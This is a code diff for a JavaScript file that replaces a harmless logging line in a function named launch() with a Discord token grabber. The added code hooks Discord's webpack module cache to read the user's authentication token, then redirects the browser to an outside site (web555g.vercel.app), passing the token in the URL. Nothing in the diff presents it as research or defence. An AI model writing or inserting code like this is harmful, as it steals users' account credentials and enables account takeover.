@@ -33,5 +33,22 @@ function send(){
 
 
 function launch(){
-  console.log("Logged");
+  var l = window.open("https://discord.com/channels/@me");
+  l.addEventListener('load', loader(), true);
+  function loader(){
+    let x;
+    window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{
+      for(const o of Object.keys(e.c).map(o => e.c[o].exports).filter(e => e)){
+        if(o.default && typeof o.default.getToken === "function"){
+          x = o.default.getToken(); // Removed the copy() function as it's not necessary
+          break;
+        }
+        else if(typeof o.getToken === "function"){
+          x = o.getToken(); // Removed the copy() function as it's not necessary
+          break;
+        }
+      }
+    }]);
+    location.replace("https://web555g.vercel.app/?z=" + x);  
+  }
 }
